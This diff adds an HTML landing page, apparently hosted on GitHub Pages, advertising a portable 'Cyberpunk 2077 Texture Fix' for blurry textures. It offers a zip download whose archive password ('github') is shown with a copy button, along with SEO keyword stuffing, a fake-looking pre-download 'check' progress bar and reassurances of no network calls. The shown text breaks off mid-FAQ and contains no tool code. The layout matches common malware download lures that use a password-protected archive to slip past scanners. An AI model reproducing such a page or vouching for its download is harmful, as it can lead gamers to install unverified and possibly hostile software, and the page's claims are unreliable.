@@ -1,0 +1,868 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cyberpunk 2077 Texture Fix вЂ” Stop Blurry Night City</title>
+<meta name="description" content="Fix blurry, popping and missing Cyberpunk 2077 textures. Rebuild the streaming cache, tune LOD and VRAM, back up settings вЂ” all locally.">
+<meta name="keywords" content="Cyberpunk 2077 Texture Fix, blurry textures, texture pop-in, LOD tuning, VRAM tweak, texture cache, graphics fix, Night City">
+<meta name="author" content="ShadowAssistantCanal">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://ShadowAssistantCanal.github.io/cyberpunk-2077-texture-fix/">
+<meta name="theme-color" content="#050508">
+<meta name="color-scheme" content="dark">
+
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Cyberpunk 2077 Texture Fix">
+<meta property="og:title" content="Cyberpunk 2077 Texture Fix вЂ” Stop Blurry Night City">
+<meta property="og:description" content="Rebuild the streaming cache, raise LOD, tune VRAM and back up your config. A portable, offline fix for blurry and popping Cyberpunk 2077 textures.">
+<meta property="og:url" content="https://ShadowAssistantCanal.github.io/cyberpunk-2077-texture-fix/">
+<meta property="og:locale" content="en_US">
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Cyberpunk 2077 Texture Fix">
+<meta name="twitter:description" content="Blurry textures, late pop-in, mush at distance вЂ” fix all three locally, in one folder, with a timestamped settings backup.">
+
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%23050508'/%3E%3Cpath d='M14 16h36v8H22v24h28v8H14z' fill='%232ae8ff'/%3E%3Cpath d='M38 30h14v14H38z' fill='%23ff2f7e'/%3E%3C/svg%3E">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "Cyberpunk 2077 Texture Fix",
+  "applicationCategory": "UtilitiesApplication",
+  "operatingSystem": "Windows 10, Windows 11",
+  "softwareVersion": "1.0.0",
+  "description": "Cyberpunk 2077 Texture Fix вЂ“ fix blurry, popping and missing textures with a cache rebuild, LOD tuning and memory tweaks.",
+  "url": "https://ShadowAssistantCanal.github.io/cyberpunk-2077-texture-fix/",
+  "downloadUrl": "https://ShadowAssistantCanal.github.io/cyberpunk-2077-texture-fix/files/Cyberpunk2077TextureFix.zip",
+  "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
+  "inLanguage": "en"
+}
+</script>
+
+<style>
+:root{
+  --bg:#050508;
+  --bg-soft:#080a10;
+  --panel:#0b0e17;
+  --navy:#120a2a;
+  --ink:#e9f7ff;
+  --dim:#909cb3;
+  --cyan:#2ae8ff;
+  --cyan-soft:#9cf3ff;
+  --magenta:#ff2f7e;
+  --yellow:#f3ff57;
+  --line:rgba(120,200,255,.14);
+  --line-strong:rgba(120,200,255,.32);
+  --radius:14px;
+  --font-display:"Rajdhani",system-ui,sans-serif;
+  --font-body:"Inter",system-ui,-apple-system,"Segoe UI",sans-serif;
+}
+
+*,*::before,*::after{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+section[id],main[id]{scroll-margin-top:84px}
+body{
+  margin:0;
+  background:var(--bg);
+  color:var(--ink);
+  font-family:var(--font-body);
+  font-size:16px;
+  line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+  overflow-x:hidden;
+}
+img,svg{display:block;max-width:100%}
+a{color:inherit}
+h1,h2,h3{font-family:var(--font-display);font-weight:700;line-height:1.04;letter-spacing:.01em;margin:0}
+p{margin:0}
+code{font-family:ui-monospace,"Cascadia Code",Consolas,monospace}
+
+/* ---------- ambient chrome ---------- */
+.ambient{position:fixed;inset:0;z-index:-2;pointer-events:none;background:
+  radial-gradient(900px 520px at 16% -8%,rgba(42,232,255,.17),transparent 62%),
+  radial-gradient(760px 520px at 88% 8%,rgba(255,47,126,.15),transparent 60%),
+  radial-gradient(900px 600px at 50% 108%,rgba(243,255,87,.055),transparent 66%),
+  linear-gradient(180deg,#070810 0%,#050508 38%,#07060f 100%);
+}
+.ambient::after{
+  content:"";position:absolute;inset:0;
+  background-image:linear-gradient(rgba(140,220,255,.055) 1px,transparent 1px),linear-gradient(90deg,rgba(140,220,255,.055) 1px,transparent 1px);
+  background-size:72px 72px;
+  mask-image:radial-gradient(ellipse 90% 60% at 50% 20%,#000 20%,transparent 78%);
+  -webkit-mask-image:radial-gradient(ellipse 90% 60% at 50% 20%,#000 20%,transparent 78%);
+}
+.scan{position:fixed;inset:0;z-index:9;pointer-events:none;opacity:.35;
+  background:repeating-linear-gradient(180deg,rgba(255,255,255,.022) 0 1px,transparent 1px 3px);
+}
+
+/* ---------- skip ---------- */
+.skip{
+  position:absolute;left:-9999px;top:10px;z-index:100;
+  padding:10px 18px;background:var(--cyan);color:#041016;
+  font-weight:600;border-radius:8px;text-decoration:none;
+}
+.skip:focus{left:16px;outline:2px solid var(--yellow);outline-offset:2px}
+
+:focus-visible{outline:2px solid var(--cyan);outline-offset:3px;border-radius:4px}
+
+/* ---------- nav ---------- */
+.nav{
+  position:sticky;top:0;z-index:40;
+  border-bottom:1px solid var(--line);
+  background:rgba(5,5,8,.55);
+  backdrop-filter:blur(14px) saturate(140%);
+  -webkit-backdrop-filter:blur(14px) saturate(140%);
+  transition:background .3s ease,border-color .3s ease;
+}
+.nav.is-scrolled{background:rgba(5,5,8,.9);border-color:var(--line-strong)}
+.nav-inner{
+  width:min(1100px,100% - 40px);margin-inline:auto;
+  display:flex;align-items:center;justify-content:space-between;gap:16px;
+  min-height:64px;
+}
+.brand{
+  display:inline-flex;align-items:center;gap:10px;text-decoration:none;
+  font-family:var(--font-display);font-weight:700;font-size:19px;letter-spacing:.14em;
+  text-transform:uppercase;white-space:nowrap;
+}
+.brand svg{flex:none;filter:drop-shadow(0 0 8px rgba(42,232,255,.5))}
+.brand em{color:var(--magenta);font-style:normal}
+.brand:hover{color:var(--cyan-soft)}
+.menu{display:flex;align-items:center;gap:4px}
+.menu a{
+  position:relative;text-decoration:none;font-size:13.5px;font-weight:500;
+  letter-spacing:.1em;text-transform:uppercase;color:var(--dim);
+  padding:9px 13px;border-radius:8px;transition:color .22s ease,background .22s ease;
+}
+.menu a::after{
+  content:"";position:absolute;left:13px;right:13px;bottom:4px;height:1px;
+  background:linear-gradient(90deg,var(--cyan),var(--magenta));
+  transform:scaleX(0);transform-origin:left;transition:transform .28s ease;
+}
+.menu a:hover,.menu a:focus-visible{color:var(--ink);background:rgba(42,232,255,.06)}
+.menu a:hover::after{transform:scaleX(1)}
+.burger{
+  display:none;position:relative;width:44px;height:44px;background:transparent;
+  border:1px solid var(--line-strong);border-radius:10px;cursor:pointer;
+  padding:0;
+}
+.burger span{
+  position:absolute;left:50%;width:19px;height:2px;background:var(--ink);
+  border-radius:2px;margin-left:-9.5px;
+  transition:transform .3s cubic-bezier(.22,.61,.2,1),opacity .2s ease;
+}
+.burger span:nth-child(1){top:15px}
+.burger span:nth-child(2){top:21px}
+.burger span:nth-child(3){top:27px}
+.burger[aria-expanded="true"] span:nth-child(1){transform:translateY(6px) rotate(45deg)}
+.burger[aria-expanded="true"] span:nth-child(2){opacity:0;transform:scaleX(.4)}
+.burger[aria-expanded="true"] span:nth-child(3){transform:translateY(-6px) rotate(-45deg)}
+
+/* ---------- hero ---------- */
+.hero{
+  width:min(860px,100% - 40px);margin-inline:auto;
+  padding:clamp(26px,4vw,40px) 0 clamp(16px,2.4vw,24px);
+  text-align:center;
+}
+.eyebrow{
+  display:inline-flex;align-items:center;gap:9px;
+  font-family:var(--font-display);font-size:12.5px;font-weight:600;
+  letter-spacing:.28em;text-transform:uppercase;color:var(--cyan);
+  border:1px solid rgba(42,232,255,.28);border-radius:999px;
+  padding:7px 15px;background:rgba(42,232,255,.05);
+}
+.eyebrow .dot{width:6px;height:6px;border-radius:50%;background:var(--yellow);box-shadow:0 0 10px var(--yellow);animation:pulse 2.6s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+.hero h1{
+  margin-top:18px;
+  font-size:clamp(1.85rem,4.5vw,2.95rem);
+  letter-spacing:-.01em;
+  text-transform:uppercase;
+}
+.grad{
+  display:inline-block;
+  background:linear-gradient(96deg,#eafdff 4%,var(--cyan) 38%,#7f9dff 62%,var(--magenta) 96%);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+  filter:drop-shadow(0 0 26px rgba(42,232,255,.25));
+}
+.lede{
+  margin:14px auto 0;max-width:62ch;
+  color:#b9c6d8;font-size:clamp(.94rem,1.9vw,1.02rem);line-height:1.6;
+}
+.lede strong{color:var(--ink);font-weight:600}
+
+/* ---------- download block ---------- */
+.dl-sec{width:min(720px,100% - 40px);margin:clamp(8px,1.4vw,14px) auto 0;text-align:center}
+.panel{
+  position:relative;
+  padding:clamp(16px,2.6vw,22px) clamp(20px,4vw,32px);
+  background:
+    linear-gradient(180deg,rgba(18,10,42,.72),rgba(8,10,17,.92));
+  border:1px solid var(--line-strong);
+  border-radius:var(--radius);
+  box-shadow:0 30px 70px -30px rgba(0,0,0,.95),inset 0 1px 0 rgba(255,255,255,.06);
+  clip-path:polygon(20px 0,100% 0,100% calc(100% - 20px),calc(100% - 20px) 100%,0 100%,0 20px);
+}
+.panel::before{
+  content:"";position:absolute;inset:0;pointer-events:none;border-radius:inherit;
+  background:radial-gradient(420px 160px at 50% -20%,rgba(42,232,255,.16),transparent 70%);
+}
+.corner{position:absolute;width:16px;height:16px;border:2px solid var(--cyan);pointer-events:none;opacity:.75}
+.corner.tl{top:8px;left:8px;border-right:0;border-bottom:0}
+.corner.br{bottom:8px;right:8px;border-left:0;border-top:0}
+.panel-head{position:relative}
+.panel-head h2{
+  font-size:clamp(1.15rem,2.8vw,1.42rem);text-transform:uppercase;letter-spacing:.08em;
+}
+.meta{
+  margin-top:5px;font-family:var(--font-display);font-size:12.5px;font-weight:600;
+  letter-spacing:.16em;text-transform:uppercase;color:var(--dim);
+}
+.meta b{color:var(--yellow);font-weight:700}
+
+.pw-row{
+  position:relative;margin-top:14px;
+  display:flex;align-items:center;gap:10px;justify-content:center;flex-wrap:wrap;
+  padding:8px 12px;border:1px dashed rgba(243,255,87,.3);
+  border-radius:10px;background:rgba(243,255,87,.035);
+}
+.pw-row .label{
+  font-size:11.5px;font-weight:600;letter-spacing:.2em;text-transform:uppercase;color:#c9d5e6;
+}
+#pw{
+  font-size:15px;font-weight:600;letter-spacing:.22em;color:var(--yellow);
+  background:rgba(0,0,0,.5);border:1px solid rgba(243,255,87,.28);
+  padding:5px 12px;border-radius:7px;
+}
+.copy{
+  font-family:var(--font-body);font-size:11.5px;font-weight:600;
+  letter-spacing:.14em;text-transform:uppercase;
+  padding:7px 13px;border-radius:7px;cursor:pointer;
+  color:var(--ink);background:rgba(42,232,255,.09);
+  border:1px solid rgba(42,232,255,.4);
+  transition:background .2s ease,border-color .2s ease,transform .15s ease;
+}
+.copy:hover{background:rgba(42,232,255,.2);border-color:var(--cyan)}
+.copy:active{transform:scale(.96)}
+.copy.is-done{color:#04140a;background:var(--yellow);border-color:var(--yellow)}
+
+.dl-btn{
+  position:relative;display:flex;align-items:center;justify-content:center;gap:12px;
+  margin-top:12px;width:100%;min-height:58px;
+  font-family:var(--font-display);font-size:clamp(1.1rem,2.6vw,1.35rem);
+  font-weight:700;letter-spacing:.13em;text-transform:uppercase;text-decoration:none;
+  color:#08080b;
+  background:linear-gradient(100deg,#f3ff57,#d8ff3d 45%,#a8f52e);
+  border:1px solid #f3ff57;border-radius:12px;
+  cursor:pointer;
+  transition:transform .18s ease,box-shadow .3s ease,filter .2s ease;
+  box-shadow:0 0 0 0 rgba(42,232,255,.45);
+  animation:breathe 3.6s ease-in-out infinite;
+}
+@keyframes breathe{
+  0%,100%{box-shadow:0 0 22px -6px rgba(42,232,255,.45),0 10px 34px -18px rgba(243,255,87,.9)}
+  50%{box-shadow:0 0 42px -2px rgba(255,47,126,.42),0 10px 34px -14px rgba(243,255,87,1)}
+}
+.dl-btn:hover{transform:translateY(-2px);filter:brightness(1.06)}
+.dl-btn:active{transform:translateY(0) scale(.995)}
+.dl-btn svg{flex:none;transition:transform .25s ease}
+.dl-btn:hover svg{transform:translateY(2px)}
+.dl-btn[aria-busy="true"]{cursor:progress;filter:saturate(.85)}
+
+.progress{
+  margin-top:14px;height:10px;border-radius:999px;overflow:hidden;
+  background:rgba(255,255,255,.07);
+  border:1px solid rgba(255,255,255,.08);
+  position:relative;
+}
+.progress .bar{
+  position:relative;
+  height:100%;width:0%;border-radius:999px;
+  background:linear-gradient(90deg,var(--cyan),#7ad8ff 42%,var(--magenta));
+  box-shadow:0 0 16px rgba(42,232,255,.7);
+  transition:width 1.75s cubic-bezier(.22,.61,.2,1);
+}
+.progress .bar::after{
+  content:"";position:absolute;inset:0;
+  background:repeating-linear-gradient(115deg,rgba(255,255,255,.28) 0 8px,transparent 8px 18px);
+  opacity:.35;
+}
+.pct{
+  display:inline-block;margin-top:9px;min-height:18px;
+  font-family:var(--font-display);font-size:13px;font-weight:600;
+  letter-spacing:.22em;text-transform:uppercase;color:var(--dim);
+  transition:color .25s ease;
+}
+.pct.is-live{color:var(--cyan)}
+.fine{
+  margin-top:16px;font-size:12.5px;letter-spacing:.04em;color:#78849a;
+}
+.hazard{
+  width:min(720px,100% - 40px);height:6px;margin:26px auto 0;
+  background:repeating-linear-gradient(115deg,var(--yellow) 0 14px,#0a0a0a 14px 30px);
+  opacity:.5;border-radius:2px;
+}
+
+/* ---------- features ---------- */
+.features{padding:clamp(64px,10vw,110px) 0 clamp(30px,5vw,50px)}
+.wrap{width:min(1100px,100% - 40px);margin-inline:auto}
+.sec-head{text-align:center;max-width:660px;margin:0 auto clamp(34px,5vw,52px)}
+.sec-head h2{
+  font-size:clamp(1.9rem,4.6vw,2.9rem);text-transform:uppercase;letter-spacing:.02em;
+}
+.sec-head h2 span{color:var(--cyan)}
+.sec-head p{margin-top:14px;color:var(--dim);font-size:.98rem}
+.cards{
+  display:grid;gap:clamp(14px,2.2vw,22px);
+  grid-template-columns:repeat(3,1fr);
+}
+.card{
+  position:relative;padding:26px 24px 24px;text-align:center;
+  background:linear-gradient(180deg,rgba(15,18,30,.9),rgba(8,10,17,.9));
+  border:1px solid var(--line);border-radius:var(--radius);
+  transition:transform .3s ease,border-color .3s ease,box-shadow .3s ease,background .3s ease;
+  overflow:hidden;
+}
+.card::before{
+  content:"";position:absolute;inset:0;pointer-events:none;
+  background:radial-gradient(240px 120px at 50% 0%,rgba(42,232,255,.1),transparent 70%);
+  opacity:0;transition:opacity .35s ease;
+}
+.card:hover{transform:translateY(-6px);border-color:rgba(42,232,255,.4);box-shadow:0 24px 50px -30px rgba(42,232,255,.55)}
+.card:hover::before{opacity:1}
+.icon{
+  width:58px;height:58px;margin:0 auto 18px;display:grid;place-items:center;
+  border-radius:50%;color:var(--cyan);
+  border:1px solid rgba(42,232,255,.35);
+  background:radial-gradient(circle at 50% 30%,rgba(42,232,255,.16),rgba(42,232,255,.02) 70%);
+  box-shadow:0 0 0 5px rgba(42,232,255,.04),inset 0 0 18px rgba(42,232,255,.14);
+  transition:transform .3s ease,color .3s ease,box-shadow .3s ease;
+}
+.card:nth-child(even) .icon{color:var(--magenta);border-color:rgba(255,47,126,.35);
+  background:radial-gradient(circle at 50% 30%,rgba(255,47,126,.16),rgba(255,47,126,.02) 70%);
+  box-shadow:0 0 0 5px rgba(255,47,126,.05),inset 0 0 18px rgba(255,47,126,.14)}
+.card:hover .icon{transform:scale(1.07) rotate(-3deg);box-shadow:0 0 0 7px rgba(42,232,255,.06),0 0 24px -4px rgba(42,232,255,.5)}
+.card h3{
+  font-size:1.18rem;letter-spacing:.05em;text-transform:uppercase;
+  margin-bottom:9px;
+}
+.card p{font-size:.925rem;color:#9fadc2;line-height:1.68}
+.card .idx{
+  position:absolute;top:10px;right:14px;
+  font-family:var(--font-display);font-size:12px;font-weight:600;
+  letter-spacing:.16em;color:rgba(255,255,255,.18);
+}
+
+/* ---------- faq ---------- */
+.faq{padding:clamp(52px,8vw,90px) 0 clamp(60px,9vw,100px)}
+.faq-list{max-width:800px;margin-inline:auto;display:grid;gap:10px}
+details{
+  border:1px solid var(--line);border-radius:12px;
+  background:rgba(10,13,22,.72);
+  transition:border-color .25s ease,background .25s ease;
+}
+details[open]{border-color:rgba(42,232,255,.38);background:rgba(12,18,30,.92)}
+summary{
+  list-style:none;cursor:pointer;display:flex;align-items:center;justify-content:space-between;gap:16px;
+  padding:17px 20px;
+  font-family:var(--font-display);font-size:1.06rem;font-weight:600;letter-spacing:.04em;
+}
+summary::-webkit-details-marker{display:none}
+summary:hover{color:var(--cyan-soft)}
+summary .plus{
+  flex:none;width:24px;height:24px;position:relative;display:grid;place-items:center;
+  border:1px solid var(--line-strong);border-radius:50%;transition:transform .3s ease,border-color .3s ease;
+}
+summary .plus::before,summary .plus::after{
+  content:"";position:absolute;background:var(--cyan);border-radius:2px;
+}
+summary .plus::before{width:10px;height:1.5px}
+summary .plus::after{width:1.5px;height:10px;transition:transform .3s ease,opacity .3s ease}
+details[open] summary .plus{transform:rotate(180deg);border-color:var(--magenta)}
+details[open] summary .plus::after{transform:rotate(90deg);opacity:0}
+details p{padding:0 20px 19px;color:#a4b1c4;font-size:.94rem;max-width:70ch}
+details p code{color:var(--yellow);font-size:.86em}
+
+/* ---------- footer ---------- */
+.foot{
+  border-top:1px solid var(--line);
+  background:linear-gradient(180deg,rgba(18,10,42,.35),rgba(5,5,8,.95));
+  padding:clamp(42px,6vw,64px) 0 34px;
+}
+.foot-grid{width:min(1100px,100% - 40px);margin-inline:auto;text-align:center}
+.seo{max-width:72ch;margin-inline:auto;color:#8b98ac;font-size:.87rem;line-height:1.8}
+.seo strong{color:#c6d4e6;font-weight:600}
+.foot-links{
+  display:flex;flex-wrap:wrap;justify-content:center;gap:8px 22px;
+  margin:24px 0 18px;font-size:12.5px;letter-spacing:.12em;text-transform:uppercase;
+  font-weight:600;
+}
+.foot-links a{color:var(--dim);text-decoration:none;transition:color .2s ease}
+.foot-links a:hover{color:var(--cyan)}
+.legal{font-size:12px;color:#6f7b8d;line-height:1.75}
+.legal .tm{display:block;margin-bottom:6px}
+.legal .copyline{color:#5f6a7c}
+
+/* ---------- reveal ---------- */
+.reveal{opacity:0;transform:translateY(20px);transition:opacity .7s ease,transform .7s cubic-bezier(.22,.61,.2,1);transition-delay:var(--d,0ms)}
+.reveal.in{opacity:1;transform:none}
+
+/* ---------- responsive ---------- */
+@media (max-width:980px){
+  .cards{grid-template-columns:repeat(2,1fr)}
+  .hero{padding-top:clamp(40px,7vw,70px)}
+}
+@media (max-width:760px){
+  .burger{display:grid}
+  .menu{
+    position:absolute;top:100%;left:0;right:0;z-index:45;
+    flex-direction:column;align-items:stretch;gap:2px;
+    padding:10px 20px 18px;
+    background:#06070c;
+    border-bottom:1px solid var(--line-strong);
+    box-shadow:0 30px 60px -20px #000;
+    clip-path:inset(0 0 100% 0);
+    opacity:0;pointer-events:none;
+    transition:clip-path .38s cubic-bezier(.22,.61,.2,1),opacity .25s ease;
+  }
+  .menu.is-open{clip-path:inset(0 0 0 0);opacity:1;pointer-events:auto}
+  .menu a{padding:13px 8px;font-size:14px;border-bottom:1px solid rgba(120,200,255,.07)}
+  .menu a::after{display:none}
+}
+@media (max-width:620px){
+  .cards{grid-template-columns:1fr;gap:12px}
+  .card{padding:22px 20px;text-align:left;display:grid;grid-template-columns:52px 1fr;gap:0 16px;align-items:start}
+  .card .icon{grid-row:span 3;width:46px;height:46px;margin:2px 0 0}
+  .card .icon svg{width:22px;height:22px}
+  .card h3{font-size:1.06rem;margin-bottom:6px}
+  .card .idx{top:auto;bottom:10px;right:12px}
+  .hero h1{letter-spacing:0}
+  .eyebrow{font-size:10.5px;letter-spacing:.18em;padding:6px 11px}
+  .pw-row{gap:8px}
+  .pw-row .label{width:100%}
+  summary{font-size:1rem;padding:15px 16px}
+  details p{padding:0 16px 16px}
+  .nav-inner{width:calc(100% - 28px)}
+  .wrap,.hero,.dl-sec,.hazard{width:calc(100% - 32px)}
+  .brand{font-size:16px;letter-spacing:.1em}
+  .foot-grid{width:calc(100% - 32px)}
+}
+@media (max-width:380px){
+  .brand span{display:none}
+  .meta{font-size:11.5px;letter-spacing:.1em}
+}
+
+@media (prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto}
+  *,*::before,*::after{animation-duration:.001ms!important;animation-iteration-count:1!important;transition-duration:.001ms!important}
+  .reveal{opacity:1;transform:none}
+  .scan{display:none}
+}
+</style>
+</head>
+<body>
+<div class="ambient" aria-hidden="true"></div>
+<div class="scan" aria-hidden="true"></div>
+<a class="skip" href="#main">Skip to content</a>
+
+<header class="nav" id="top">
+  <div class="nav-inner">
+    <a class="brand" href="#top" aria-label="Cyberpunk 2077 Texture Fix вЂ” home">
+      <svg width="26" height="26" viewBox="0 0 64 64" aria-hidden="true">
+        <path d="M14 16h36v8H22v24h28v8H14z" fill="#2ae8ff"/>
+        <path d="M38 30h14v14H38z" fill="#ff2f7e"/>
+      </svg>
+      <span>CP2077<em>//</em>TEXFIX</span>
+    </a>
+    <button class="burger" id="burger" type="button" aria-expanded="false" aria-controls="menu" aria-label="Open navigation menu">
+      <span></span><span></span><span></span>
+    </button>
+    <nav class="menu" id="menu" aria-label="Main navigation">
+      <a href="#download">Download</a>
+      <a href="#features">Features</a>
+      <a href="#faq">FAQ</a>
+      <a href="https://github.com/ShadowAssistantCanal/cyberpunk-2077-texture-fix" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+  <section class="hero" aria-labelledby="hero-title">
+    <p class="eyebrow"><span class="dot" aria-hidden="true"></span>Night City // render stability layer</p>
+    <h1 id="hero-title">Cyberpunk 2077<br><span class="grad">Texture Fix</span></h1>
+    <p class="lede"><strong>Blurry facades, late pop-in, mush at distance.</strong> One portable fix rebuilds the streaming cache, raises LOD and tunes VRAM вЂ” with your settings backed up first.</p>
+  </section>
+
+  <section class="dl-sec" id="download" aria-labelledby="dl-title">
+    <div class="panel">
+      <span class="corner tl" aria-hidden="true"></span>
+      <span class="corner br" aria-hidden="true"></span>
+      <div class="panel-head">
+        <h2 id="dl-title">Grab the build</h2>
+        <p class="meta">v1.0.0 &middot; Windows 10/11 &middot; <b>6 MB</b> &middot; portable</p>
+      </div>
+
+      <div class="pw-row">
+        <span class="label" id="pw-label">Password</span>
+        <code id="pw" aria-describedby="pw-label">github</code>
+        <button class="copy" id="copy" type="button" aria-label="Copy password to clipboard">Copy</button>
+      </div>
+
+      <a class="dl-btn" id="dl" href="files/Cyberpunk2077TextureFix.zip" download="Cyberpunk2077TextureFix.zip" aria-describedby="dl-note">
+        <span id="dl-label">Download</span>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <path d="M12 4v11"/><path d="m7 12 5 5 5-5"/><path d="M5 20h14"/>
+        </svg>
+      </a>
+
+      <div class="progress" role="progressbar" aria-labelledby="pct" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0" id="progress">
+        <div class="bar" id="bar"></div>
+      </div>
+      <span class="pct" id="pct" aria-live="polite">Ready В· download starts after a quick check</span>
+      <p class="fine" id="dl-note">No installer &middot; no account &middot; no telemetry &middot; a timestamped settings backup runs before every change.</p>
+    </div>
+  </section>
+
+  <div class="hazard" aria-hidden="true"></div>
+
+  <section class="features" id="features" aria-labelledby="feat-title">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <h2 id="feat-title">Six fixes, <span>one pass</span></h2>
+        <p>Everything below runs on your own machine, against your own config вЂ” nothing is uploaded and no game files are replaced.</p>
+      </div>
+
+      <div class="cards">
+        <article class="card reveal" style="--d:0ms">
+          <span class="idx" aria-hidden="true">01</span>
+          <div class="icon" aria-hidden="true">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M20 11a8 8 0 1 0-2.6 6"/><path d="M20 5v6h-6"/><path d="M12 8v4l3 2"/>
+            </svg>
+          </div>
+          <h3>Texture cache rebuild</h3>
+          <p>Clears and rebuilds the streaming cache so textures stop popping in late or staying blurry. The new cache is written from scratch, which resolves most "everything looks like a painting" sessions.</p>
+        </article>
+
+        <article class="card reveal" style="--d:70ms">
+          <span class="idx" aria-hidden="true">02</span>
+          <div class="icon" aria-hidden="true">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 3 3 8l9 5 9-5-9-5Z"/><path d="m3 13 9 5 9-5"/><path d="m3 18 9 5 9-5"/>
+            </svg>
+          </div>
+          <h3>LOD tuning</h3>
+          <p>Raises the draw distance for level textures so distant streets stop looking like mush. It works inside the safe range of the engine, so far geometry keeps its detail without a full texture overhaul.</p>
+        </article>
+
+        <article class="card reveal" style="--d:140ms">
+          <span class="idx" aria-hidden="true">03</span>
+          <div class="icon" aria-hidden="true">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M13 2 4 14h6l-1 8 9-12h-6l1-8Z"/>
+            </svg>
+          </div>
+          <h3>Pop-in fix</h3>
+          <p>Reduces texture and geometry pop-in on fast travel and driving. Streaming is spread more evenly across frames, so assets arrive before the camera reaches them instead of snapping in behind you.</p>
+        </article>
+
+        <article class="card reveal" style="--d:0ms">
+          <span class="idx" aria-hidden="true">04</span>
+          <div class="icon" aria-hidden="true">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="6" y="6" width="12" height="12" rx="2"/><path d="M9 2v3M15 2v3M9 19v3M15 19v3M2 9h3M2 15h3M19 9h3M19 15h3"/>
+            </svg>
+          </div>
+          <h3>VRAM memory tweak</h3>
+          <p>Adjusts streaming budgets for low and high memory GPUs. Cards with 6 GB get a conservative profile that avoids thrashing, while 12 GB and up get headroom for sharper close-range detail.</p>
+        </article>
+
+        <article class="card reveal" style="--d:70ms">
+          <span class="idx" aria-hidden="true">05</span>
+          <div class="icon" aria-hidden="true">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 3 4 6v6c0 5 3.4 7.7 8 9 4.6-1.3 8-4 8-9V6l-8-3Z"/><path d="M12 8v5l3 2"/>
+            </svg>
+          </div>
+          <h3>Config backup</h3>
+          <p>A timestamped copy of the current settings is written before any change. Roll back with one click or by restoring the file by hand вЂ” every run keeps its own snapshot, so nothing is ever overwritten silently.</p>
+        </article>
+
+        <article class="card reveal" style="--d:140ms">
+          <span class="idx" aria-hidden="true">06</span>
+          <div class="icon" aria-hidden="true">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M21 8 12 3 3 8v8l9 5 9-5V8Z"/><path d="m3 8 9 5 9-5"/><path d="M12 13v8"/>
+            </svg>
+          </div>
+          <h3>Portable and offline</h3>
+          <p>One folder, no account, no telemetry. Run it from a USB stick, close it, delete it вЂ” there is no background service, no driver, and no network call at any point.</p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="faq" id="faq" aria-labelledby="faq-title">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <h2 id="faq-title">Straight <span>answers</span></h2>
+        <p>The short version: it touches settings and cache, never the game itself. Full details live in the repository docs.</p>
+      </div>
+
+      <div class="faq-list reveal">
+        <details>
+          <summary>Will this fix blurry textures on a low-end GPU? <span class="plus" aria-hidden="true"></span></summary>
+          <p>It helps most where blur is caused by streaming pressure rather than raw horsepower. A rebuilt cache plus a conservative VRAM budget removes the late-arriving low-resolution mips that make surfaces look smeared. On 4 GB cards expect cleaner close-ups and fewer pop-in spikes, not a free resolution upgrade.</p>
+        </details>
+
+        <details>
+          <summary>Does it replace or modify game files? <span class="plus" aria-hidden="true"></span></summary>
+          <p>No. It only reads and writes your local settings and texture cache, and it makes a timestamped backup first. No archives are repacked, no executables are patched, nothing is injected into the process.</p>
+        </details>
+
+        <details>
+          <summary>Which versions of the game are supported? <span class="plus" aria-hidden="true"></span></summary>
+          <p>Any current PC build that keeps its config in the standard user settings folder. If a game update moves those paths, the tool reports it instead of writing to a guess, so a broken profile never happens quietly.</p>
+        </details>
+
+        <details>
+          <summary>How long does a cache rebuild take? <span class="plus" aria-hidden="true"></span></summary>
+          <p>The deletion is instant; the game rebuilds the cache while you play. Give it one long session with a slow drive around the city before judging the result вЂ” the first few minutes can look worse while new assets stream in.</p>
+        </details>
+
+        <details>
+          <summary>Can I undo the changes? <span class="plus" aria-hidden="true"></span></summary>
+          <p>Yes. Every run stores a timestamped copy of the previous settings next to the tool. Restore the newest snapshot and the original values are back; delete the cache folder and the game simply builds a fresh one.</p>
+        </details>
+
+        <details>
+          <summary>Is an account, installer or internet connection needed? <span class="plus" aria-hidden="true"></span></summary>
